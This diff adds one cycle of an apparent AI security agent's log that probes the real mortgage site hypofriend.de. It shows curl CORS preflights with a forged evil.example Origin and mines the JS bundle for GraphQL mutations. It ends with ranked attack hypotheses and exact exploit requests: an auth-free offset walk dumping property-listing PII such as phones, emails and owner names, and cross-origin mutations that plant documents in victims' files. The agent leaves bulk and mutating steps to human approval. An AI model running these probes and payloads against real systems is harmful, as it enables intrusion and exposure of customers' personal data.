@@ -17588,3 +17588,496 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] hypofriend: 99 — CRITICAL, unchanged. Two independent auth-free GraphQL APIs (property-search-api full-DB BOLA + PII dump with origin WAF bypass; /q-family credentialed CORS + auth-free file-upload/lead mutations under SameSite=None sessions across /q, /en/health/q, /en/plus/q) plus anonymous per-region lender-rate oracle. Today's SPA rebuild rotated bundles but left every precondition intact (CORS echoes verified 17:46Z); the only schema change ever observed (calculateMaklerFee removal) did not touch the dangerous surface. Remaining gates (bulk PII quantification, victim-session mutation PoC) are HUMAN-decided.
+===== ANALYST bigpickle 2026-09-11 20:40:36 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/plus.html -w "%{http_code} %{url_effective}\n" -H "User-Agent: Mozilla/5.0" https://hypofriend.de/en/plus ; sleep 1; curl -s -o /tmp/opencode/health.html -w "%{http_code} %{url_effective}\n" -H "User-Agent: Mozilla/5.0" https://hypofriend.de/en/health
+200 https://hypofriend.de/en/plus
+200 https://hypofriend.de/en/health
+[0m
+[0m$ [0mcd /tmp/opencode && for u in "https://hypofriend.de/q" "https://core.hypofriend.de/q" "https://core.hypofriend.de/property-search-api" "https://core.hypofriend.de/en/health/q" "https://core.hypofriend.de/en/plus/q"; do curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -H "User-Agent: Mozilla/5.0" "$u"; sleep 1; done
+301 https://hypofriend.de/
+301 https://hypofriend.de/
+400 
+301 https://hypofriend.de/
+301 https://hypofriend.de/
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE '/m/_nuxt/[A-Za-z0-9._-]+\.js' plus.html | sort -u | head -50; echo "---HEALTH---"; grep -oE '/m/_nuxt/[A-Za-z0-9._-]+\.js' health.html | sort -u | head -50; echo "---LINECOUNT---"; wc -c plus.html health.html
+/m/_nuxt/-ez_sPea.js
+/m/_nuxt/031sR0Dk.js
+/m/_nuxt/1ffzw_uW.js
+/m/_nuxt/22Pu5ap6.js
+/m/_nuxt/5wututiN.js
+/m/_nuxt/6UsJxw1M.js
+/m/_nuxt/7LJm_38-.js
+/m/_nuxt/8xAStZmc.js
+/m/_nuxt/AuiHv9WO.js
+/m/_nuxt/B0dqiS1K.js
+/m/_nuxt/B1jEw4nT.js
+/m/_nuxt/B2vkSg1F.js
+/m/_nuxt/B35S2sub.js
+/m/_nuxt/B5BZbSY_.js
+/m/_nuxt/B6htIPxk.js
+/m/_nuxt/B8CvfFn4.js
+/m/_nuxt/B8hvNOgq.js
+/m/_nuxt/BB4Th1SC.js
+/m/_nuxt/BBxB1IXZ.js
+/m/_nuxt/BDCKj7Z4.js
+/m/_nuxt/BFkLEQEW.js
+/m/_nuxt/BGOMXBgc.js
+/m/_nuxt/BJcVsjK6.js
+/m/_nuxt/BKlQgSLc.js
+/m/_nuxt/BLmaZOZ4.js
+/m/_nuxt/BPBpAwO3.js
+/m/_nuxt/BTAmUJjN.js
+/m/_nuxt/BV5qoEBw.js
+/m/_nuxt/BW0GL25j.js
+/m/_nuxt/Ba3ZnGVB.js
+/m/_nuxt/Bath4SLi.js
+/m/_nuxt/BbB2_50l.js
+/m/_nuxt/BdeLHqFd.js
+/m/_nuxt/BfLwAJw2.js
+/m/_nuxt/BffYpcM-.js
+/m/_nuxt/BfzKNeeB.js
+/m/_nuxt/Bg2yj5my.js
+/m/_nuxt/BgWiLdqc.js
+/m/_nuxt/BisG11dB.js
+/m/_nuxt/Bmm7VTnW.js
+/m/_nuxt/Bq4hPrUD.js
+/m/_nuxt/BuvF3Au4.js
+/m/_nuxt/C4B0Srdn.js
+/m/_nuxt/C4lxPvnl.js
+/m/_nuxt/C6flwG_K.js
+/m/_nuxt/C7tsFAqe.js
+/m/_nuxt/C8fqSiI-.js
+/m/_nuxt/C9fzl-VO.js
+/m/_nuxt/CA5phdJX.js
+/m/_nuxt/CApZFFZt.js
+---HEALTH---
+---LINECOUNT---
+297417 plus.html
+    89 health.html
+297506 total
+[0m
+[0m$ [0mfor u in "https://hypofriend.de/en/health/q" "https://hypofriend.de/en/plus/q"; do curl -s -o /tmp/opencode/probe.json -w "%{http_code}\n" -H "User-Agent: Mozilla/5.0" -H "Origin: https://evil.example" -H "Content-Type: application/json" -d '{"query":"query{__typename}"}' "$u"; head -c 300 /tmp/opencode/probe.json; echo; sleep 1; done; curl -s -o /tmp/opencode/probe2.json -w "%{http_code}\n" -H "User-Agent: Mozilla/5.0" -H "Origin: https://evil.example" -H "Content-Type: application/json" -d '{"query":"query{__typename}"}' "https://core.hypofriend.de/en/health/q"; head -c 300 /tmp/opencode/probe2.json
+200
+{"meta":{"serverTime":"2026-09-11T20:20:49+00:00","status":0,"key":"OK"},"data":{"Typename":"Query"}}
+200
+{"meta":{"serverTime":"2026-09-11T20:20:50+00:00","status":0,"key":"OK"},"data":{"Typename":"Query"}}
+200
+{"meta":{"serverTime":"2026-09-11T20:20:51+00:00","status":0,"key":"OK"},"data":{"Typename":"Query"}}
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE '<script[^>]*src="[^"]*"' plus.html | head; echo "---"; grep -oE '"/m/_nuxt/[A-Za-z0-9._-]+\.js"' plus.html | sort -u | head; echo "---PAYLOAD---"; grep -oE 'window\.__NUXT__|__NUXT_DATA__' plus.html | sort -u | head; grep -cO 'src=' plus.html
+<script id="usercentrics-cmp" src="https://app.usercentrics.eu/browser-ui/latest/loader.js"
+<script type="module" src="/m/_nuxt/CbMiwoX2.js"
+<script type="application/json" data-nuxt-data="nuxt-app" data-ssr="true" id="__NUXT_DATA__" data-src="/en/plus/m_payload.json?4a2197ec-400b-4c9c-bc22-4fa734654643"
+---
+"/m/_nuxt/-ez_sPea.js"
+"/m/_nuxt/031sR0Dk.js"
+"/m/_nuxt/1ffzw_uW.js"
+"/m/_nuxt/22Pu5ap6.js"
+"/m/_nuxt/5wututiN.js"
+"/m/_nuxt/6UsJxw1M.js"
+"/m/_nuxt/7LJm_38-.js"
+"/m/_nuxt/8xAStZmc.js"
+"/m/_nuxt/AuiHv9WO.js"
+"/m/_nuxt/B0dqiS1K.js"
+---PAYLOAD---
+__NUXT_DATA__
+window.__NUXT__
+grep: invalid option -- 'O'
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
+[0m
+[0m$ [0mcd /tmp/opencode && curl -s -H "User-Agent: Mozilla/5.0" -o CbMiwoX2.js https://hypofriend.de/m/_nuxt/CbMiwoX2.js && wc -c CbMiwoX2.js && grep -oE 'uploadDocumentExtended|processLeadForAppointment|unclaimLead|requestAccountLink|requestAppointmentLink|setNameAppointment|already_booked|appointment_availability|rates_table|coreApiUrl|/q' CbMiwoX2.js | sort | uniq -c
+1334338 CbMiwoX2.js
+     11 /q
+      1 already_booked
+      2 appointment_availability
+      6 coreApiUrl
+      5 processLeadForAppointment
+      2 rates_table
+      3 requestAccountLink
+      7 requestAppointmentLink
+      2 setNameAppointment
+      9 unclaimLead
+      2 uploadDocumentExtended
+[0m
+[0m$ [0mcd /tmp/opencode && for k in uploadDocumentExtended processLeadForAppointment unclaimLead requestAccountLink requestAppointmentLink setNameAppointment appointment_availability already_booked rates_table; do echo "=== $k ==="; grep -oE '.{0,120}'"$k"'.{0,200}' CbMiwoX2.js | head -3; done
+=== uploadDocumentExtended ===
+    mutation uploadDocumentExtended($type: String!, $files: [File!]!, $document_type: String!, $applicant_type: String!) {
+      uploadDocumentExtended(input: { type: $type, file: $files, document_type: $document_type, applicant_type: $applicant_type }) {
+=== processLeadForAppointment ===
+rrentRoute.value,r,r||Oe(t.$i18n.defaultLocale));await t.$i18n.setLocale(n.locale),t._vueI18n.__firstAccess=!1})}}),MR={processLeadForAppointment:()=>`
+      processLeadForAppointment(input: {}) {
+?e.baseUrl:void 0,s={...MR,...r};return{async checkIfLeadIsReturnerAndCalculateExpectedValue(){const{data:l}=await Ke(s.processLeadForAppointment(),{operationName:"processLeadForAppointment",baseUrl:n});return l?.data?.processLeadForAppointment||!1},async fetchAppointmentCalendar(l){const{data:c}=await Ke(s.fetchAppointmentCalendar(l),{operati
+=== unclaimLead ===
+  `,unclaimLead:()=>`
+    mutation unclaimLead {
+      unclaimLead(input: {}) {
+=== requestAccountLink ===
+    mutation requestAccountLink {
+      requestAccountLink(input: {email: "${e}"}) {
+}){const t={...MB,...e};return{async requestLogin(r){return(await Ke(t.requestLogin(r),{forceCoreApi:!0}))?.data?.data?.requestAccountLink||!1},async requestAppointmentLink(r){return(await Ke(t.requestAppointmentLink(r)))?.data?.data?.requestAppointmentLink||!1},async getAdminCookie(){const r=t.getAdminCookie();try{const{data:n}=await K
+=== requestAppointmentLink ===
+  `,requestAppointmentLink:e=>`
+    mutation requestAppointmentLink {
+      requestAppointmentLink(input: {email: "${e}"}) {
+=== setNameAppointment ===
+    mutation setNameAppointment {
+      setNameAppointment(input: {
+=== appointment_availability ===
+        appointment_availability(
+        appointment_availability_for_advisor(
+=== already_booked ===
+        already_booked_appointments(lead_id: "${e}"){
+=== rates_table ===
+          rates_table(
+          rates_table(
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== setNameAppointment ==="; grep -oE 'setNameAppointment.{0,400}' CbMiwoX2.js | head -2; echo "=== getAdminCookie ==="; grep -oE '.{0,150}getAdminCookie.{0,250}' CbMiwoX2.js | head -3; echo "=== requestLogin ==="; grep -oE '.{0,80}requestLogin.{0,120}' CbMiwoX2.js | head -3
+=== setNameAppointment ===
+setNameAppointment {
+setNameAppointment(input: {
+=== getAdminCookie ===
+  `,getAdminCookie:()=>`
+.requestAccountLink||!1},async requestAppointmentLink(r){return(await Ke(t.requestAppointmentLink(r)))?.data?.data?.requestAppointmentLink||!1},async getAdminCookie(){const r=t.getAdminCookie();try{const{data:n}=await Ke(r);return n?.data?.root?.lead?.hasAdminCookie||{hasCookie:!1,name:null,email:null}}catch(n){return console.error("Error trying to get the Admin Cookie",r,n),{hasCookie:!1,name:null,email:null}}
+  `,getAdminCookie:()=>`
+=== requestLogin ===
+arCookie(){const{status:r}=await wk("delete-cookie");return r===200}}}const MB={requestLogin:e=>`
+  `};function SB(e={}){const t={...MB,...e};return{async requestLogin(r){return(await Ke(t.requestLogin(r),{forceCoreApi:!0}))?.data?.data?.requestAccountLink||!1},async requestAppointmentL
+a:p7}),eT={namespaced:!0,actions:YB,getters:KB,mutations:JB,state:QB},tT={async requestLogin(e,{email:t,routeName:r}){const n=!!r?.match(/^appointment(?!.*confirm)/),s=a2();return n?await s.login.requestAppointme
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== getAdminCookie op ==="; grep -oE 'getAdminCookie\(\)=>`[^`]{0,400}' CbMiwoX2.js | head -1; echo "=== hasAdminCookie ctx ==="; grep -oE '.{0,200}hasAdminCookie.{0,200}' CbMiwoX2.js | head -3; echo "=== delete-cookie ==="; grep -oE '.{0,60}delete-cookie.{0,60}' CbMiwoX2.js | head -2; echo "=== fetchAppointmentCalendar ==="; grep -oE '.{0,80}fetchAppointmentCalendar.{0,150}' CbMiwoX2.js | head -2
+=== getAdminCookie op ===
+=== hasAdminCookie ctx ===
+k(r){return(await Ke(t.requestAppointmentLink(r)))?.data?.data?.requestAppointmentLink||!1},async getAdminCookie(){const r=t.getAdminCookie();try{const{data:n}=await Ke(r);return n?.data?.root?.lead?.hasAdminCookie||{hasCookie:!1,name:null,email:null}}catch(n){return console.error("Error trying to get the Admin Cookie",r,n),{hasCookie:!1,name:null,email:null}}}}}function AB(e){if(!e)return"";let t=e.normalize("
+){const r=n=>({hasCookie:n?.hasCookie===null?null:n?.hasCookie===!0,name:n?.name??null,email:n?.email??null});try{const n=await Ke(t.getAdminCookie(),!1,"getAdminCookie"),s=n?.data?.data?.root?.lead?.hasAdminCookie??n?.data?.data?.root?.lead?.has_admin_cookie;return r(s)}catch(n){return console.error("Error during `getAdminCookie`",n),r(null)}},async clearAdminCookie(){await C8("delete-admin-cookie")},persistFa
+=== delete-cookie ===
+.success||!1},async clearCookie(){const{status:r}=await wk("delete-cookie");return r===200}}}const MB={requestLogin:e=>`
+.root.lead.claimerAdminEmail},async clearCookie(){await C8("delete-cookie")},async fetchLeadState(){return(await Ke(t.fetchLeadState(
+=== fetchAppointmentCalendar ===
+  `,fetchAppointmentCalendar:({page:e,per:t,appointmentType:r})=>`
+orAppointment",baseUrl:n});return l?.data?.processLeadForAppointment||!1},async fetchAppointmentCalendar(l){const{data:c}=await Ke(s.fetchAppointmentCalendar(l),{operationName:"fetchAppointmentCalendar",baseUrl:n});return c.data.root.appointmentAvailabil
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== admin-cookie variants ==="; grep -oE '.{0,80}(set|clear)[A-Z]?[a-z]*[Aa]dmin[Cc]ookie.{0,120}' CbMiwoX2.js | head -6; echo "=== delete-admin-cookie ==="; grep -oE '.{0,80}delete-admin-cookie.{0,80}' CbMiwoX2.js | head -3; echo "=== claimerAdminEmail ==="; grep -oE '.{0,100}claimerAdminEmail.{0,100}' CbMiwoX2.js | head -3; echo "=== claim ==="; grep -oE '.{0,60}[A-Za-z]*[Ll]ead[A-Za-z]*claim.{0,100}' CbMiwoX2.js | head -5
+=== admin-cookie variants ===
+atch(n){return console.error("Error during `getAdminCookie`",n),r(null)}},async clearAdminCookie(){await C8("delete-admin-cookie")},persistFacebokConversion(){Promise.all([h7.awaitNonNullgetFbClientId(),h7.getFbConve
+)},SP=async function({commit:t}){const r=await a2().website.getAdminCookie();t("setAdminCookieData",r)},AP=async function({commit:t}){await a2().website.clearAdminCookie(),t("setAdminCookieData",{hasCookie:null,nam
+Property({__proto__:null,detectDevice:rV,detectEligibleLead:eV,detectNewLead:tV,setAdminCookieData:sV,setBreadcrumbs:qP,setEligibleForAccount:XP,setEmailValidation:GP,setFunnel:nV,setHasReferrer:KP,setLeadGivenName
+=== delete-admin-cookie ===
+"Error during `getAdminCookie`",n),r(null)}},async clearAdminCookie(){await C8("delete-admin-cookie")},persistFacebokConversion(){Promise.all([h7.awaitNonNullgetFbClientId(),h7.ge
+=== claimerAdminEmail ===
+t.validate},async getAdvisor(){return(await Ke(t.getAdvisor(),!1,"getAdvisor")).data.data.root.lead.claimerAdminEmail},async clearCookie(){await C8("delete-cookie")},async fetchLeadState(){return(await Ke(t.fetchLeadS
+mail=t.email,e.referrerLead.givenName=t.givenName,e.referrerLead.surename=t.surename,e.referrerLead.claimerAdminEmail=t.claimerAdminEmail,e.referrerLead.propertyLocation=t.propertyLocation},QP=(e,t)=>{e["validations.p
+erLead.surename.length<1?"":e.referrerLead.surename,referrerLeadClaimerAdminEmail:e=>e.referrerLead.claimerAdminEmail,claimedAdvisorOfReferrerLead:e=>e.referrerLead.claimerAdminEmail===null?"stephan":e.referrerLead.cl
+=== claim ===
+[0m
+[0m$ [0mfor u in "https://core.hypofriend.de/en/plus/q" "https://hypofriend.de/en/plus/q" "https://core.hypofriend.de/en/health/q" "https://hypofriend.de/en/health/q"; do echo "=== $u ==="; curl -s -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" "$u" | grep -iE 'HTTP/|access-control-allow|vary' | head -8; sleep 1; done
+=== https://core.hypofriend.de/en/plus/q ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+vary: Accept-Encoding
+=== https://hypofriend.de/en/plus/q ===
+HTTP/2 200 
+vary: Accept-Encoding
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+=== https://core.hypofriend.de/en/health/q ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+vary: Accept-Encoding
+=== https://hypofriend.de/en/health/q ===
+HTTP/2 200 
+vary: Accept-Encoding
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-allow-credentials: true
+access-control-allow-headers: content-type
+[0m
+[0m$ [0mfor h in "https://hypofriend.de/property-search-api" "https://core.hypofriend.de/property-search-api" "https://a.hypofriend.de/" "https://admin.hypofriend.de" "https://api.hypofriend.de"; do curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -H "User-Agent: Mozilla/5.0" "$h"; sleep 1; done
+400 
+400 
+403 
+503 
+000
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== setNameAppointment op ==="; grep -oE 'setNameAppointment.{0,10}\{.{0,250}' CbMiwoX2.js | head -2; echo "=== fetchAppointmentCalendar op ==="; grep -oE 'fetchAppointmentCalendar:.{0,8}\{.{0,400}' CbMiwoX2.js | head -2; echo "=== requestLogin op ==="; grep -oE 'requestLogin:e=>.{0,500}' CbMiwoX2.js | head -1; echo "=== fetchLeadState op ==="; grep -oE 'fetchLeadState:.{0,350}' CbMiwoX2.js | head -2
+=== setNameAppointment op ===
+setNameAppointment {
+setNameAppointment(input: {
+=== fetchAppointmentCalendar op ===
+fetchAppointmentCalendar:({page:e,per:t,appointmentType:r})=>`
+=== requestLogin op ===
+requestLogin:e=>`
+=== fetchLeadState op ===
+fetchLeadState:()=>`
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+import re
+s=open('CbMiwoX2.js',encoding='utf-8',errors='replace').read()
+for key in ['requestAccountLink:','requestAppointmentLink:','requestLogin:e','setNameAppointment:(','fetchAppointmentCalendar:(','fetchLeadState:(','getAdminCookie:(','unclaimLead:(','processLeadForAppointment:(','uploadDocumentExtended($']:
+    i=s.find(key)
+    if i<0:
+        print('MISS',key); continue
+    print('=====',key.strip(':( ')); print(s[i:i+420].strip()[:420]); print()
+EOF
+MISS requestAccountLink:
+===== requestAppointmentLink
+requestAppointmentLink:e=>`
+    mutation requestAppointmentLink {
+      requestAppointmentLink(input: {email: "${e}"}) {
+        leadPresent
+        firstName
+      }
+    }
+  `,getAdminCookie:()=>`
+    query {
+      root {
+        lead {
+          has_admin_cookie
+        }
+      }
+    }
+  `};function SB(e={}){const t={...MB,...e};return{async requestLogin(r){return(await Ke(t.requestLogin(r),{forceCoreApi:!0}))?.dat
+
+===== requestLogin:e
+requestLogin:e=>`
+    mutation requestAccountLink {
+      requestAccountLink(input: {email: "${e}"}) {
+        step
+        leadPresent
+        firstName
+      }
+    }
+  `,requestAppointmentLink:e=>`
+    mutation requestAppointmentLink {
+      requestAppointmentLink(input: {email: "${e}"}) {
+        leadPresent
+        firstName
+      }
+    }
+  `,getAdminCookie:()=>`
+    query {
+      root {
+        lead {
+
+MISS setNameAppointment:(
+===== fetchAppointmentCalendar
+fetchAppointmentCalendar:({page:e,per:t,appointmentType:r})=>`
+    query {
+      root {
+        appointment_availability(
+          page: ${e},
+          per: ${t},
+          appointment_type: "${r}"
+        )
+      }
+    }
+  `,fetchAdvisorAppointmentCalendar:({page:e,per:t,appointmentType:r,advisor:n})=>`
+    query {
+      root {
+        appointment_availability_for_advisor(
+          page: ${e},
+          per: ${t}
+
+===== fetchLeadState
+fetchLeadState:()=>`
+    query {
+      root {
+        lead {
+          has_referrer
+          eligible_for_account
+          referrer {
+            email
+            given_name
+            surename
+            claimer_admin_email
+            property_location
+            primary_advisor {
+              firstName
+              gender
+              email
+              picture
+            }
+          }
+        }
+      }
+
+===== getAdminCookie
+getAdminCookie:()=>`
+    query {
+      root {
+        lead {
+          has_admin_cookie
+        }
+      }
+    }
+  `};function SB(e={}){const t={...MB,...e};return{async requestLogin(r){return(await Ke(t.requestLogin(r),{forceCoreApi:!0}))?.data?.data?.requestAccountLink||!1},async requestAppointmentLink(r){return(await Ke(t.requestAppointmentLink(r)))?.data?.data?.requestAppointmentLink||!1},async getAdminCookie(){co
+
+===== unclaimLead
+unclaimLead:()=>`
+    mutation unclaimLead {
+      unclaimLead(input: {}) {
+        success
+      }
+    }
+  `};function EB(e={}){const t={...kB,...e};return{async fetchClaimedAdvisor(r){const{data:n}=await Ke(t.fetchClaimedAdvisor(r),!1,"fetchClaimedAdvisor");return n.data.root.lead?n.data.root.lead:!1},async fetchDefaultAdvisor(r){const{data:n}=await Ke(t.fetchDefaultAdvisor(r),!1,"fetchDefaultAdvisor");return n.dat
+
+===== processLeadForAppointment
+processLeadForAppointment:()=>`
+    mutation {
+      processLeadForAppointment(input: {}) {
+        leadIsReturner
+        revUpdated
+      }
+    }
+  `,fetchAppointmentCalendar:({page:e,per:t,appointmentType:r})=>`
+    query {
+      root {
+        appointment_availability(
+          page: ${e},
+          per: ${t},
+          appointment_type: "${r}"
+        )
+      }
+    }
+  `,fetchAdvisorAppointmentCalendar:({page:e
+
+===== uploadDocumentExtended($
+uploadDocumentExtended($type: String!, $files: [File!]!, $document_type: String!, $applicant_type: String!) {
+      uploadDocumentExtended(input: { type: $type, file: $files, document_type: $document_type, applicant_type: $applicant_type }) {
+        step
+      }
+    },
+  `};function xB(e={}){const t={...LB,...e};return{async submitApplicantsInformation(r){const{data:n}=await Ke(t.submitApplicantsInformation(r),!1,"s
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+import re
+s=open('CbMiwoX2.js',encoding='utf-8',errors='replace').read()
+i=s.find('setNameAppointment:(')
+print('setNameAppointment idx',i)
+seg=s[i:i+700]
+print(seg[:700])
+print()
+print('shareLink mentions:', len(re.findall(r'shareLink',s)))
+print('self_disclosure mentions:', len(re.findall(r'self_disclosure|selfDisclosure',s)))
+print('eligible_for_account:', len(re.findall(r'eligible_for_account',s)))
+print('submitApplicantsInformation:', len(re.findall(r'submitApplicantsInformation',s)))
+python END
+EOF
+File "<stdin>", line 12
+    python END
+           ^^^
+SyntaxError: invalid syntax
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+import re
+s=open('CbMiwoX2.js',encoding='utf-8',errors='replace').read()
+i=s.find('setNameAppointment:(')
+seg=s[i:i+700]
+print('--- setNameAppointment ---')
+print(seg[:700])
+for pat,name in [('shareLink','shareLink'),('self','self_disclosure'),('eligible_for_account','eligible_for_account'),('submitApplicantsInformation','submitApplicantsInformation'),('rates_table','rates_table'),('getAdvisor','getAdvisor')]:
+    print(name, len(re.findall(pat,s)))
+EOF
+--- setNameAppointment ---
+
+shareLink 1
+self_disclosure 31
+eligible_for_account 4
+submitApplicantsInformation 5
+rates_table 2
+getAdvisor 4
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+import re
+s=open('CbMiwoX2.js',encoding='utf-8',errors='replace').read()
+for (key,lab) in [('setNameAppointment',40),('shareLink',1)]:
+    for m in list(re.finditer(re.escape('setNameAppointment') if lab==40 else re.escape('shareLink'), s))[:3]:
+        print('---',key,'---')
+        print(s[m.start()-80:m.start()+240].replace('\n',' ')[:320]); print()
+EOF
+--- setNameAppointment ---
+chResult"))?.data?.data?.exposes??[]}}}const VB={saveLeadName:e=>`     mutation setNameAppointment {       setNameAppointment(input: {         name: "${e}"       }) { step }     }   `,saveOriginalSignupFlow:e=>`     mutation {       setOriginalSignupFlow(input: {         originalSignupFlow: "${e}"       }) {         st
+
+--- setNameAppointment ---
+poses??[]}}}const VB={saveLeadName:e=>`     mutation setNameAppointment {       setNameAppointment(input: {         name: "${e}"       }) { step }     }   `,saveOriginalSignupFlow:e=>`     mutation {       setOriginalSignupFlow(input: {         originalSignupFlow: "${e}"       }) {         step       }     }   `};funct
+
+--- shareLink ---
+:()=>`     query {       root {         lead {           selfDisclosureFormLink:shareLink(linkType: "self_disclosure_form")         }       }     }   `,setLocale:()=>`     mutation setLocale($locale: LocaleEnum!) {       setLocale(input: { locale: $locale }) {         step       }     }   `,unclaimLead:()=>`     mutati
+[0m
+STEP 1 — DELTA
+- [CHANGED] Nuxt SPA rebuilt today 14:52Z — entry chunk `CbMiwoX2.js` (1,334,338 B) replaced prior `xcLo8I7Y.js` (404). Full GraphQL surface re-mined: every mutation/query op string **identical** to pre-rebuild — `uploadDocumentExtended($type:String!,$files:[File!]!,$document_type:String!,$applicant_type:String!)`, `processLeadForAppointment(input:{})`→{leadIsReturner,revUpdated}, `unclaimLead(input:{})`→{success}, `requestAccountLink/requestAppointmentLink(input:{email})`→{step,leadPresent,firstName}, `setNameAppointment(input:{name})`→{step}, `shareLink(linkType:"self_disclosure_form")`, `getAdminCookie`→`root.lead.has_admin_cookie`, `rates_table`, `already_booked_appointments(lead_id)`.
+- [CONFIRMED] Credentialed CORS re-proven 20:21Z on all 4 `/q` combos (edge+origin × health+plus): OPTIONS 200 echo `access-control-allow-origin: https://evil.example` + `ACAC:true` + `GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD`.
+- [COUNTERED] origin `GET /en/health/q` & `/en/plus/q` = 301→hypofriend.de/, but **POST = 200 GraphQL** `{"meta":{"key":"OK"},"data":{"Typename":"Query"}}` — matches main `/q` GET-301/POST-200 split; direct-origin GraphQL is live, no change.
+- [NO_DELTA] Fleet sweep: `/property-search-api` 400 both hosts, `a.` 403, `admin` 503, `api` 000 — bit-identical.
+
+STEP 2 — PRIORITIZE
+- [PRIO] core.hypofriend.de/property-search-api — score 9.65 (a10/b10/t9/g10/c9/f9) — full-DB PII BOLA, origin WAF bypass, unchanged CRITICAL
+- [PRIO] core.hypofriend.de/en/health/q + /en/plus/q (+edge twins) — score 8.65 (a9/b9/t9/g8/c7/f9) — credentialed CORS + auth-free multipart-upload/lead mutations post-rebuild
+- [PRIO] hypofriend.de/q — score 8.15 (a9/b8/t8/g8/c7/f8) — anonymous rate oracle + raw-interpolation injection surface
+
+STEP 3 — HYPOTHESES
+```
+[HYP] /en/health/q & /en/plus/q — credentialed CORS + auth-free mutation set survives SPA rebuild byte-identically
+class: MISCONFIG
+asset: hypofriend.de/en/health/q (+core.hypofriend.de/en/health/q, hypofriend.de/en/plus/q, core.hypofriend.de/en/plus/q)
+confidence: 88
+reasoning: CbMiwoX2.js re-mined 20:20Z — uploadDocumentExtended(4 non-null args, [File!]! multipart), processLeadForAppointment(input:{}), unclaimLead(input:{}), requestAccountLink/requestAppointmentLink(input:{email}), setNameAppointment(input:{name}) all present. All 4 OPTIONS echo arbitrary Origin + ACAC:true + all methods live. Session cookies SameSite=None;Secure on /en/health. Prior cycle: mutations returned 200 Typename w/o session.
+evidence_needed: none passively — HUMAN-authorized benign multipart POST to confirm upload handler executes; POST-with-O rigin ACAO echo on mutation.
+verify_steps: HUMAN REPORT: POST core.hypofriend.de/en/plus/q `{"query":"mutation uploadDocumentExtended($type:String!,$files:[File!]!,$document_type:String!,$applicant_type:String!){uploadDocumentExtended(input:{type:$type,file:$files,document_type:$document_type,applicant_type:$applicant_type}){step}}","variables":{"type":"test","files":[],"document_type":"test","applicant_type":"test"}}` w/ Origin https://evil.example — observe step/error-class + ACAO echo (non-PII, no auth).
+impact: attacker page plants arbitrary documents into victim mortgage/insurance file + injects appointment leads + unclaims advisor under victim SameSite=None session on a financial platform. HIGH-CRITICAL
+testability: AUTH_HELPED
+```
+```
+[HYP] property-search-api — full-DB auth-free PII enumeration via offset-walk, direct-origin bypass intact
+class: IDOR
+asset: core.hypofriend.de/property-search-api
+confidence: 95
+reasoning: unchanged every cycle since 09-04; full introspection; propertySearch→exposes→expose returns PII (cellPhoneNumber, providerEmail, propertyOwnerLastName) with zero auth; limit cap ~50 → offset walk; origin responses bare. Re-verified 400-class this cycle (GraphQL gate live).
+evidence_needed: HUMAN-authorized bulk offset-walk to quantify DB (program note: no customer PII exposure).
+verify_steps: HUMAN REPORT — POST core.hypofriend.de/property-search-api `{"query":"query{propertySearch(city:BERLIN,propertyType:APARTMENT){id}}"}` → offset-walk `exposes(id,offset:0..N,limit:50)` → `expose(id)` per UUID (read-only).
+impact: full-DB property-listing PII dump (phones, emails, owner surnames, companies), zero auth. CRITICAL
+testability: AUTH_HELPED
+```
+```
+[HYP] /en/health/q & /en/plus/q — mutation execution auth-free independent of /q schema
+class: IDOR
+asset: core.hypofriend.de/en/health/q (+core.hypofriend.de/en/plus/q)
+confidence: 74
+reasoning: main /q already_booked_appointments resolves 200 for arbitrary lead_id no session; health/plus distinct schema (no introspection); prior cycle both mutations returned 200 payload w/o session; fresh bundle (shared with /q) confirms same dispatcher — loginEnabled:false client instance. POST 200 `__typename` re-proven on origin 20:20Z.
+evidence_needed: current per-mutation success-vs-error class with vs without fresh jar (HUMAN-authorized, non-PII).
+verify_steps: PROBE-PENDING-AUTH POST core.hypofriend.de/en/plus/q `{"query":"mutation{processLeadForAppointment(input:{}){leadIsReturner}}"}`; compare `{"meta":{status:0...}}` success vs validation error on both /en/plus/q and /en/health/q.
+impact: anonymous appointment-lead creation on two product lines; document store write. HIGH
+testability: AUTH_HELPED
+```
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] `requestAccountLink`/`requestAppointmentLink` arbitrary-email oracle (`input:{email}` returns `leadPresent,firstName`) — response is a live account-existence + partial-PII oracle, BUT executing it actually SENDS a magic-link email = mutating + customer-data-exposure class; passive-first rule excludes it. HUMAN-decided.
+- [PARKED] `getAdminCookie`→`root.lead.has_admin_cookie` — session-scoped admin flag reader, no ID input; not a cross-tenant primitive; surfaced only to document the admin-cookie system (distinct from already-REJECTED `internal` cookie).
+- [FINAL] 1. property-search-api full-DB BOLA — 95
+- [FINAL] 2. /en/health/q & /en/plus/q credentialed CORS + auth-free mutations — 88 (raised: op strings re-confirmed byte-identical post-rebuild)
